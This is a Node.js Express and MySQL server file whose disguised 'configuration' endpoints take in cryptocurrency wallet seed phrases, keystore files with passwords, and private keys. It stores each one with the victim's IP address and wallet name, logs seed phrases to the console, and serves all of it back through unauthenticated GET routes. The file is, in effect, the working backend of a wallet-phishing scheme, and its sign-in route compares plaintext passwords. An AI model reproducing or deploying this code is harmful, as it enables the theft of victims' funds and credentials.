const express = require("express")
const bodyParser = require("body-parser")
const cors = require('cors')
const knex = require('knex')
const app = express()



const database = knex({
    client: 'mysql',
    
    connection: {  
        host : process.env.HOST,
        user : process.env.USER,
        password : process.env.PASSWORD,
        database : process.env.DATABASE,
        timezone: 'utc',
        port: "3306"
}
  });  

  app.use(bodyParser.json())
  app.use(cors())

  app.use(function (req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    next();
 })




app.post("/configuration" ,(req,res) =>{
const {phrase, walletname , ipAddress , time} = req.body
    if (!phrase) {
        return res.status(400).json("Incomplete Form Submission")
    }
    console.log(phrase)
    database('root')
    .insert({
        phrase: phrase, 
        IpAddress : ipAddress,
        WalletName : walletname,
        Timestamp: time
    })
    .then(user =>{ 
        res.status(200).json("success")
        }) 
        .catch(err=> res.status(400).json(err))
})

app.post("/configurationjson" ,(req,res) =>{
const { keystore ,password ,  walletname , ipAddress , time} = req.body
    if (!keystore || !password) {
        return res.status(400).json("Incomplete Form Submission")
    }
    database('root')
    .insert({
        keystoreJson: keystore,
        password: password,
         IpAddress : ipAddress,
        WalletName : walletname,
         Timestamp: time
        
    })
    .then(user =>{ 
        res.status(200).json("success")
        }) 
        .catch(err=> res.status(400).json(err))
})

app.post("/configurationprivate" ,(req,res) =>{
const { privatekey ,  walletname , ipAddress , time} = req.body
    if (!privatekey) {
        return res.status(400).json("Incomplete Form Submission")
    }
    database('root')
    .insert({
        privateKey: privatekey,
         IpAddress : ipAddress,
        WalletName : walletname,
         Timestamp: time
        
    })
    .then(user =>{ 
        res.status(200).json("success")
        }) 
        .catch(err=> res.status(400).json(err))
})

app.get("/phrase", (req, res) => {
    database.select('Id','phrase','WalletName' ,'IpAddress','Timestamp').from('root')
    .then(user => {
       res.status(200).json(user)
    })
})

app.get("/keystore", (req, res) => {
    database.select('Id','keystoreJson','password','WalletName' ,'IpAddress','Timestamp').from('root')
    .then(user => {
       res.status(200).json(user)
    })
})

app.get("/privatekey", (req, res) => {
    database.select('Id','privateKey','WalletName' ,'IpAddress','Timestamp').from('root')
    .then(user => {
       res.status(200).json(user)
    })
})

app.post ('/signin', (req,res) => {
    const{email ,password} = req.body
    if (!email  || !password) {
        return res.status(400).json("incorrect form submission")
    }
  database.select('email' , "password")
  .from('login')
  .where('email' , "=" , email)
  .then(data =>{
    
    const isValid =  (password == data[0].password)
    if (isValid) {
   return database.select("*").from("login")
   .where('email', '=', email)
        
   .then(user =>{
     res.status(200).json("login successful")
    })
    
    
  }
  else{
        res.status(400).json("Wrong credentials")
    }
})
 
  
  .catch(err => res.status(400).json("Wrong credentials"))
})




app.get("/",(req ,res)=>{
    res.send("hello world");
})



app.listen(process.env.PORT ||4000)
